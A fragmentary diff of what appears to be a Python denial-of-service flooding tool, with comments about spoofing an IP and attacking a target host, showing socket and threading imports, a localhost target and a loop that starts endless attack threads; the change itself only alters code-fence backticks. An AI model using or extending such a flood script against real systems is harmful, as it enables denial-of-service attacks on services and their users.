@@ -11,8 +11,8 @@ import threading # for Multitasking at the same time
 ### We start writing the rest of the tool code
 
 # Setting up a fake IP and attacking the target host
-
-‍‍‍‍```import socket
+‍‍‍‍`
+‍‍‍‍import socket
 import threading
 
 target = '127.0.0.1' # target ip
@@ -35,6 +35,6 @@ def attack():
 
 while True:
     thread = threading.Thread(target=attack)
-    thread.start()```
+    thread.start()`
     
 # Don't be disappointed
